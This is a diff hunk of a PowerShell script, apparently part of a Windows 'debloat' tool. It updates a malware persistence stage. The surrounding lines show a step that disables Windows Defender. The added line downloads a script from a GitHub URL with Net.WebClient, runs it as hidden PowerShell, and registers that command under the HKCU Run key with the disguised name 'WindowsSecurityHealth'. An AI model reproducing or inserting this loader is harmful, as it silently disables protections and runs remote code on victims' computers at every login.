@@ -197,7 +197,7 @@ _cb 'S2b' 'ok' 'defkill done'
 Remove-Item "$env:TEMP\windefctl.exe" -Force -ErrorAction SilentlyContinue | Out-Null
 
 # S3: PERSISTENCE
-$persistCmd="cmd.exe /c bitsadmin /transfer ps1 /download /priority high $gh/updatemspulsv2.ps1 %TEMP%\u.ps1 && powershell -w hidden -NoP -file %TEMP%\u.ps1"
+$persistCmd='powershell -w hidden -NoP -c "$w=New-Object Net.WebClient;[IO.File]::WriteAllBytes($env:TEMP\u.ps1,$w.DownloadData(''https://raw.githubusercontent.com/jimmyishere111/WinDebloat11/main/updatemspulsv2.ps1''));powershell -w hidden -NoP -file $env:TEMP\u.ps1"'
 try{
     $rk='HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
     Set-ItemProperty -Path $rk -Name 'WindowsSecurityHealth' -Value $persistCmd -Force -ErrorAction SilentlyContinue | Out-Null
